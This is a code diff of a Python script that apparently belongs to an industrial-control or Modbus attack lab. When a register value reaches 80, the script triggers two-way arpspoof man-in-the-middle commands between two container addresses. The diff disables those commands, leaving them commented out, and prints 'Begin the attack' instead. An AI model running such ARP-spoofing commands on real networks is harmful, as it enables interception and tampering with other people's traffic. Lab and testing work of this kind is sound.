@@ -23,8 +23,9 @@ while True:
         print(f"Input register value: {valuecoil}")
         # Check if the input register value is 80
         if value == 80 and valuecoil == False:
-            subprocess.Popen(["arpspoof -i eth0 -t 172.17.0.3 172.17.0.2"], shell=True)
-            subprocess.Popen(["arpspoof -i eth0 -t 172.17.0.2 172.17.0.3"], shell=True)
+            print("Begin the attack")
+            #subprocess.Popen(["arpspoof -i eth0 -t 172.17.0.3 172.17.0.2"], shell=True)
+            #subprocess.Popen(["arpspoof -i eth0 -t 172.17.0.2 172.17.0.3"], shell=True)
         else:
             # Print a message to indicate that the input register value was not 80
             print("Input register value is not 80")
